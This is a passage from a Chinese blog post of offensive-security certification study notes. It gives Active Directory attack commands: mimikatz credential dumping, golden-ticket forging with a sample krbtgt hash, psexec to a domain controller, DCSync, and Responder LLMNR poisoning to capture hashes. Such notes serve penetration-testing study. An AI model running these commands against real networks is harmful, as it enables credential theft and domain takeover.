<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;lsadump::lsa /patch&quot;</span><br></code></pre></td></tr></table></figure>

<p>获取SID</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">GetDomainsid (PowerView)<br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">whoami /user<br></code></pre></td></tr></table></figure>

<p>执行黄金票据并利用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">mimikatz.exe <span class="hljs-string">&quot;kerberos::purge&quot;</span> <span class="hljs-string">&quot;kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt&quot;</span> <span class="hljs-string">&quot;misc::cmd&quot;</span><br><br>psexec.exe \\dc1 cmd.exe<br></code></pre></td></tr></table></figure>

<h3 id="DC同步攻击"><a href="#DC同步攻击" class="headerlink" title="DC同步攻击"></a>DC同步攻击</h3><p>DCSync 攻击包括向域控制器请求复制更新并获取 Active Directory 中每个帐户的密码哈希值，而无需登录域控制器。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./mimikatz.exe <span class="hljs-string">&quot;lsadump::dcsync /user:Administrator&quot;</span><br></code></pre></td></tr></table></figure>

<h3 id="SMB-的-NetNTLM-身份验证漏洞-LLMNR-中毒-捕获响应程序中的哈希值"><a href="#SMB-的-NetNTLM-身份验证漏洞-LLMNR-中毒-捕获响应程序中的哈希值" class="headerlink" title="SMB 的 NetNTLM 身份验证漏洞 - LLMNR 中毒 - 捕获响应程序中的哈希值"></a>SMB 的 NetNTLM 身份验证漏洞 - LLMNR 中毒 - 捕获响应程序中的哈希值</h3><p>Responder 允许您在 NetNTLM 身份验证期间通过中毒响应来执行中间人攻击，使客户端与您对话，而不是与它想要连接的真实服务器对话。在真实的 LAN 网络上，响应者将尝试毒害检测到的所有链路本地多播名称解析 (LLMNR)、NetBIOS 名称服务器 (NBT-NS) 和 Web 代理自动发现 (WPAD) 请求。NBT-NS 是 LLMNR 的前身协议。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">responder -I eth0 -v<br></code></pre></td></tr></table></figure>


                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Offensive-security/" class="print-no-link">#Offensive security</a>
      
        <a href="/tags/Learning-Notes/" class="print-no-link">#Learning Notes</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>国外某进攻性安全证书-书籍技巧-2023版本</div>
      <div>https://sh1yan.top/2024/06/01/Attack-certificate-Book-Skills-2023-rodolfomarianocy/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>shiyan</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年6月1日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/06/02/Windows-Command-Notes-Collection-hacktoday-net-20201201/" title="Windows 命令备忘笔记集合-hacktoday.net-2020.12.01版本">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Windows 命令备忘笔记集合-hacktoday.net-2020.12.01版本</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/06/01/Attack-certificate-memorandum-20230311-0xsyr0/" title="国外某进攻性安全证书-备忘录-2023.3.11版本">
                        <span class="hidden-mobile">国外某进攻性安全证书-备忘录-2023.3.11版本</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2025</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
